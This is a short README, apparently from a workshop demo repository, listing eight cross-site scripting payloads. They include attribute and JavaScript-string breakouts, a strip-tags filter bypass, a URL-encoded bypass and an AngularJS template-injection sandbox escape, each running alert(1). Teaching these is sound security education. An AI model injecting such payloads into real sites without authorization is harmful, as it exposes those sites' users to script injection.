# XSS-Demo

Some popular cases i explained at STEM workshop

**Case 1 [ Simple XSS ]**

Payload : <script>alert(1)</script>

**Case 2 [ JavaScript injection ]**

Payload : “-alert(1)-”

**Case 3 [ XSS Inside html attribute ]**

Payload : “><script>alert(1)</script>

**Case 4 [ XSS Inside html attribute ( Bypassing strip tags filter ) ]**

Payload : “ onmouseover=“alert(1)

**Case 5 [ Bypassing tags matching ( with URL encoding ) ]**

Payload : %22%3E%3Cscript%3Ealert%281%29%3C%2fscript%3E

**Case 6 [ Simple DOM-XSS ]**

Payload : <script>alert(1)</script>

**Case 7 [ DOM-XSS ( Client side template injection with AngularJS ) ]**

Payload : {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

Angular payloads URL : https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs

**Case 8 [ JavaScript injection ( Escape JS ) ]**

Payloads : \”-alert(1)//
